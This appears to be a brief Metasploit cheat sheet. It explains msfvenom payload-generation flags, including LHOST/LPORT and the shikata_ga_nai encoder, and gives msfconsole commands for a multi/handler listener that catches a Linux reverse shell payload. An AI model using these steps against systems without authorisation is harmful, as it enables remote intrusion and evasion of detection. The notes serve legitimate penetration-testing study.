msfvenom-> used to create payloads
msfconsole-> used to interact with and manage those payloads
use-> Interact with a module by name or search term/index
options-> Displays global options or for one or more modules
set-> Sets a context-specific variable to a value
handler-> Start a payload handler as job
jobs-> Displays and manages jobs
-p -> specific payload type
LHOST-> IP address of attacker machine that works as listener
LPORT-> Port number of the attacker machine that will listen
-f -> spacific format of output file[like .elf for Linux, .exe for windows, .apk for android, .ps1 for powershell script]
-e -> Specifies the encoder to use, such as shikata_ga_nai, which is commonly used for encoding payloads.




To use a payload created with msfvenom, you will often need msfconsole to set up a listener and manage connections. For example, after creating a reverse shell payload, you would use msfconsole to listen for incoming connections 
msfconsole
msf > use exploit/multi/handler
msf > set payload linux/x86/shell_reverse_tcp
msf > set LHOST 
msf > set LPORT 
msf > run
